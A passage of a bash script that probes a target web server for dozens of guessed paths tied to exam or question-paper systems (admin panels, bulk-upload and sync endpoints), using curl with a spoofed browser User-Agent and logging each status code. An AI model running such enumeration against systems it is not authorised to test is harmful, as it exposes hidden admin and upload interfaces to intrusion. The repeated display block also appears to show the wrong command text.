payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler-DataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler-DataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper-Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper-Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P_DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P_DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystemQsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystemQsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagerQPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagerQPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringTool-QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringTool-QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto_Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto_Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow-QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow-QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper_Panel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper_Panel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessor-QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessor-QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Platform-QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Platform-QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadServiceQPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadServiceQPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploadUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploadUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUpload-QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUpload-QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P_Sync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P_Sync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload_MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload_MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow-QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow-QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService_QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService_QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitorHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitorHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSync-QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSync-QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData-Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData-Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module_ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module_ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData_Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData_Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile-DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile-DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper-Sync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper-Sync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUploadQPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUploadQPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload-QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload-QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem_MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem_MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB-MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB-MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData_DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData_DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulkMassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulkMassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAutoMonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAutoMonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlerQ_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlerQ_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDocManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDocManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Transfer-QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Transfer-QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager_QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager_QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ControlQPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ControlQPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystem-QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystem-QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager_QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager_QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService_Sync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService_Sync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystem_QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystem_QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin_Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin_Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor_Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor_Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster_DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster_DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringQPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringQPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUploadQPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUploadQPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster_Suite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster_Suite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper_DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper_DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessingDashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessingDashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PortalQPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PortalQPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk-BulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk-BulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService_DatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService_DatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringQPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringQPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler-QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler-QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

